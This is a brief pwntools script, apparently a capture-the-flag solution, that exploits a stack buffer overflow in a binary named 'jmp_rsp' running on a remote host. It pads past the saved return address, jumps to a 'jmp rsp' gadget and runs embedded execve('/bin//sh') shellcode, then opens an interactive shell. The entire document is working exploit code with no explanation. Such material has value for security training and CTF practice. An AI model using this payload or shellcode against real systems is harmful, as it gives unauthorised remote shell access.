from pwn import *

p = remote('119.23.41.54', 45318)
#p = process('jmp_rsp')

jmp_rsp = 0x46d01d
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
#gdb.attach(p)

payload = b'a' * (0x80 + 8) + p64(jmp_rsp)
payload += shellcode
p.sendline(payload)

p.interactive()


